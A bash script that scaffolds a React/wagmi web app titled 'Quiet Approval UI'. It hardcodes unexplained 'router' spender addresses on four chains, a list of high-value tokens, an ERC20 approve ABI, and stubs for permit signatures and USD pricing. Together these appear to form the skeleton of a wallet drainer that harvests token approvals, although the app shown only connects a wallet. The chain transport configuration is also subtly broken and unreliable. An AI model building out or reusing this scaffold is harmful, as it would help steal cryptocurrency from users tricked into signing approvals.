#!/bin/bash
set -e

# Init project
npm create vite@latest . -- --template react-ts
npm i

# Core deps
npm i wagmi viem zustand @tanstack/react-query
npm i -D tailwindcss postcss autoprefixer @vitejs/plugin-react

# Tailwind init
npx tailwindcss init -p

# Tailwind config
cat > tailwind.config.js <<'CFG'
export default {
  content: ["./index.html","./src/**/*.{js,ts,jsx,tsx}"],
  theme: { extend: {} },
  plugins: [],
}
CFG

# index.css
cat > src/index.css <<'CSS'
@tailwind base;
@tailwind components;
@tailwind utilities;
CSS

# ErrorBoundary
cat > src/ErrorBoundary.tsx <<'TSX'
import React from 'react'
type P={children:React.ReactNode}; type S={error?:any}
export class ErrorBoundary extends React.Component<P,S>{
  constructor(p:P){super(p);this.state={}}
  static getDerivedStateFromError(error:any){return{error}}
  componentDidCatch(err:any,info:any){console.error('UI error:',err,info)}
  render(){
    if(this.state.error){
      return <div style={{padding:16}}>
        <h2>Something went wrong.</h2>
        <pre>{String(this.state.error?.message||this.state.error)}</pre>
      </div>
    }
    return this.props.children
  }
}
TSX

# chains config
mkdir -p src/config src/lib
cat > src/config/chains.ts <<'TS'
import { mainnet, bsc, polygon, arbitrum } from 'wagmi/chains'
export const CHAINS=[mainnet,bsc,polygon,arbitrum]
export const transports={
  [mainnet.id]:{http:()=>fetch(import.meta.env.VITE_RPC_ETHEREUM)},
  [bsc.id]:{http:()=>fetch(import.meta.env.VITE_RPC_BSC)},
  [polygon.id]:{http:()=>fetch(import.meta.env.VITE_RPC_POLYGON)},
  [arbitrum.id]:{http:()=>fetch(import.meta.env.VITE_RPC_ARBITRUM)},
}
TS

# routers config
cat > src/config/routers.ts <<'TS'
export const ROUTERS:Record<number,string> = {
  1:"0x966c0cEA6e08Dd16b35a7b07dcE39E755Ed57C74",      // Ethereum
  56:"0xA7F671A611334DAb9C54cAD307C79410B6BcF33B",     // BSC
  137:"0x2b4B75e5F147BECf62BE83E952c86191163C8B35",    // Polygon
  42161:"0xC64b437fe9941AF4Aa68f51221FAA71C1c19DF4a",  // Arbitrum
}
TS

# tokens config (example 8 tokens)
cat > src/config/tokens.ts <<'TS'
import { Address } from "viem"
type Token={symbol:string,address:Address,decimals:number}
export const TOKENS:Record<number,Token[]> = {
  1:[
    {symbol:"USDT",address:"0xdAC17F958D2ee523a2206206994597C13D831ec7",decimals:6},
    {symbol:"USDC",address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",decimals:6},
    {symbol:"DAI", address:"0x6B175474E89094C44Da98b954EedeAC495271d0F",decimals:18},
    {symbol:"WBTC",address:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",decimals:8},
    {symbol:"LINK",address:"0x514910771AF9Ca656af840dff83E8264EcF986CA",decimals:18},
    {symbol:"UNI", address:"0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",decimals:18},
    {symbol:"MATIC",address:"0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0",decimals:18},
    {symbol:"AAVE",address:"0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",decimals:18}
  ]
}
TS

# abi
cat > src/lib/abi.ts <<'TS'
export const ERC20=[{name:"balanceOf",type:"function",stateMutability:"view",inputs:[{name:"owner",type:"address"}],outputs:[{type:"uint256"}]},
{name:"approve",type:"function",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}]
TS

# permit + prices stub
cat > src/lib/permit.ts <<'TS'
export async function supportsPermit2612(token:string,user:string){return false}
export async function buildPermitTypedData(){return {} as any}
export function splitSig(sig:string){return {v:27,r:"0x",s:"0x"}}
TS
cat > src/lib/prices.ts <<'TS'
export async function fetchUsdPrices(chainId:number,addrs:string[]){return {} as any}
TS

# App.tsx (simplified working scaffold)
cat > src/App.tsx <<'TSX'
import { useEffect, useState } from "react"
import { useAccount, useChainId, useConnect, useDisconnect } from "wagmi"
import { injected } from "wagmi/connectors"

export default function App(){
  const {connectAsync} = useConnect()
  const {disconnect} = useDisconnect()
  const {address,isConnected} = useAccount()
  const chainId=useChainId()
  const [msg,setMsg]=useState("")

  async function connect(){await connectAsync({connector:injected()})}

  useEffect(()=>{if(isConnected) setMsg("Connected: "+address)},[isConnected,address])

  return <div style={{padding:20}}>
    <h1>Quiet Approval UI</h1>
    {!isConnected?
      <button onClick={connect}>Connect</button>:
      <button onClick={()=>disconnect()}>Disconnect</button>}
    <div>Chain: {chainId}</div>
    <pre>{msg}</pre>
  </div>
}
TSX

# main.tsx
cat > src/main.tsx <<'TSX'
import React from "react"
import ReactDOM from "react-dom/client"
import { WagmiProvider, createConfig } from "wagmi"
import { injected } from "wagmi/connectors"
import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
import { CHAINS, transports } from "./config/chains"
import App from "./App"
import { ErrorBoundary } from "./ErrorBoundary"
import "./index.css"

const config=createConfig({
  chains:CHAINS as any,
  transports,
  connectors:[injected()],
  ssr:false,
})
const qc=new QueryClient()

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode>
    <WagmiProvider config={config}>
      <QueryClientProvider client={qc}>
        <ErrorBoundary>
          <App/>
        </ErrorBoundary>
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
)
TSX
